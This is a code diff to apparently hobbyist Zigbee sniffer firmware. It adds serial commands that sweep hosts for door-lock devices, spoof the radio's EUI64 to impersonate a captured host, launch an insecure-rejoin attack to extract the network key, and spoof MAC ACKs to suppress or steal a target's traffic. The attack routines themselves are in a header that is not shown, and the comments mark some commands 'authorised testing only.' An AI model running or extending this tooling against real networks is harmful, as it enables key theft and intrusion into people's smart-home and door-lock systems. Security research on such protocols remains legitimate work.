@@ -19,6 +19,15 @@
  *           addr omitted, e.g. J04A7 to target a specific host)
  *   P<addr> Ping a host (ZDO Node Descriptor request) - requires a join and
  *           a captured network key. P alone sweeps every known host.
+ *   L[addr] find_lock: probe a host (or L alone = sweep all) for the Door
+ *           Lock cluster (0x0101). Requires a join + network key.
+ *   M<addr> Spoof our EUI64 to that of a known host (M alone restores the
+ *           real hardware MAC).
+ *   R<addr> insecure_rejoin attack: impersonate a host and send an unsecured
+ *           rejoin request to try to make the Trust Center re-transport the
+ *           network key.  ** authorised testing of your own network only **
+ *   A[addr] ack_attack: spoof MAC ACKs to a target to suppress/steal its
+ *           traffic (A alone = stop / status).  ** authorised testing only **
  */
 
 #include "USB.h"
@@ -30,6 +39,7 @@
 #include "ZbKeyCapture.h"
 #include "ZbJoiner.h"
 #include "ZbPing.h"
+#include "ZbAttack.h"
 
 
 // -- Known device labels -------------------------------------------------------
@@ -47,6 +57,7 @@ SnifferSD         sd;
 ZbKeyCapture      keyCapture(sniffer);
 ZbJoiner          joiner(sniffer);
 ZbPing            zping(sniffer, joiner);
+ZbAttack          zattack(sniffer);
 static bool hopping = false;
 static bool scanning = false;
 static uint8_t scanChannel = 0;
@@ -299,8 +310,44 @@ void handleSerial() {
             }
             Serial.printf("[Ping] Sweep sent to %d host(s)\n", sent);
         }
+    } else if (cmd[0] == 'L' && cmd.length() > 1) {
+        // L<addr> - find_lock on a specific host
+        uint16_t addr = (uint16_t)strtol(cmd.substring(1).c_str(), nullptr, 16);
+        HostRecord *h = sniffer.findHost(addr);
+        if (!h)
+            Serial.printf("[Lock] Unknown host 0x%04X - use 'l' to list hosts\n", addr);
+        else
+            zping.findLock(h->shortAddr, h->panId);
+    } else if (cmd == "L") {
+        // L (no addr) - sweep all known hosts for the Door Lock cluster
+        zping.findLockSweepAll();
+    } else if (cmd[0] == 'M' && cmd.length() > 1) {
+        // M<addr> - spoof our EUI64 to that of a known host
+        uint16_t addr = (uint16_t)strtol(cmd.substring(1).c_str(), nullptr, 16);
+        HostRecord *h = sniffer.findHost(addr);
+        if (!h)
+            Serial.printf("[Spoof] Unknown host 0x%04X - use 'l' to list hosts\n", addr);
+        else if (h->extAddr == 0)
+            Serial.printf("[Spoof] No captured EUI64 for 0x%04X yet\n", addr);
+        else
+            sniffer.setOwnEUI64(h->extAddr);
+    } else if (cmd == "M") {
+        // M (no addr) - restore the real hardware MAC
+        sniffer.restoreOwnEUI64();
+    } else if (cmd[0] == 'R' && cmd.length() > 1) {
+        // R<addr> - insecure_rejoin attack impersonating a known host
+        uint16_t addr = (uint16_t)strtol(cmd.substring(1).c_str(), nullptr, 16);
+        zattack.insecureRejoin(addr);
+    } else if (cmd[0] == 'A' && cmd.length() > 1) {
+        // A<addr> - start ack_attack against a host
+        uint16_t addr = (uint16_t)strtol(cmd.substring(1).c_str(), nullptr, 16);
+        zattack.ackAttack(addr);
+    } else if (cmd == "A") {
+        // A (no addr) - stop the ack_attack if running, else print status
+        if (sniffer.isAckAttackActive()) zattack.stopAckAttack();
+        else zattack.printAckAttackStatus();
     } else {
-        Serial.println("Commands: c<ch>  h(op)  j(oin-status)  J[addr](oin)  k(eys)  l(ist)  p(cap)  P[addr](ing)  s(tats) channel(S)can H(eader) d(U)ps t<addr>,<type>,<label>  r(eset)");
+        Serial.println("Commands: c<ch>  h(op)  j/J[addr](oin)  k(eys)  l(ist)  p(cap)  P[addr](ing)  L[addr]ock  M[addr]spoof  R<addr>ejoin  A[addr]ck  s(tats) (S)can H(eader) d(U)ps t<a>,<ty>,<l>  r(eset)");
     }
 }
 
@@ -375,7 +422,7 @@ void setup() {
         sd.listFiles();
     }
 
-    Serial.println("Ready. Commands: c<ch>  h(op)  j(oin-status)  J[addr](oin)  k(eys)  K(→SD)  l(ist)  p(cap)  P[addr](ing)  W(rite)  F(iles)  s(tats)");
+    Serial.println("Ready. Commands: c<ch>  h(op)  j/J[addr](oin)  k(eys)  K(→SD)  l(ist)  p(cap)  P[addr](ing)  L[addr]ock  M[addr]spoof  R<addr>ejoin  A[addr]ck  W(rite)  F(iles)  s(tats)");
     show_header();
 }
 
